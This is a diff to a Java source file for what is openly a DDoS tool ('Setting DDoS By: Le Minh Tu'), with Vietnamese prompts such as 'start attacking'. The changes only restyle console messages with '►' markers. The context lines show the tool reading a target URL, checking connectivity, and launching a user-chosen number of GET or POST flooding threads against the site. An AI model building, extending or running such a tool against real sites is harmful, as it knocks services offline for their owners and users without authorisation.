@@ -52,23 +52,23 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Nhập Url: ");
+        System.out.print("╔═══ Nhập Url: ");
         url = in.nextLine();
         System.out.println("\n");
-        System.out.println("Bắt đầu tấn công : " + url);
+        System.out.println("► Bắt đầu tấn công : " + url);
 
         String[] SUrl = url.split("://");
 
-        System.out.println("Kiểm tra kết nối đến Website");
+        System.out.println("► Kiểm tra kết nối đến Website");
         if (SUrl[0] == "http" || SUrl[0].equals("http")) {
             dos.checkConnection(url);
         } else {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Le Minh Tu");
+        System.out.println("► Setting DDoS By: Le Minh Tu");
 
-        System.out.print("Số Luồng : ");
+        System.out.print("► Số Luồng : ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
@@ -77,7 +77,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("Method : ");
+        System.out.print("► Method : ");
         String option = in.nextLine();
         int ioption = 1;
         if (option == "get" || option == "GET") {
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(999999);
 
 
-        System.out.println("--> Bắt Đầu Tấn Công!");
+        System.out.println("► Bắt Đầu Tấn Công!");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
@@ -117,7 +117,7 @@ public class Dos implements Runnable {
     }
 
     private void checkConnection(String url) throws Exception {
-        System.out.println("Checking Connection");
+        System.out.println("► Checking Connection");
         URL obj = new URL(url);
         HttpURLConnection con = (HttpURLConnection) obj.openConnection();
         con.setRequestMethod("GET");
@@ -125,7 +125,7 @@ public class Dos implements Runnable {
 
         int responseCode = con.getResponseCode();
         if (responseCode == 200) {
-            System.out.println("Connected to website");
+            System.out.println("► Connected to website");
         }
         Dos.url = url;
     }
@@ -139,7 +139,7 @@ public class Dos implements Runnable {
 
         int responseCode = con.getResponseCode();
         if (responseCode == 200) {
-            System.out.println("Connected to website");
+            System.out.println("► Connected to website");
         }
         Dos.url = url;
     }
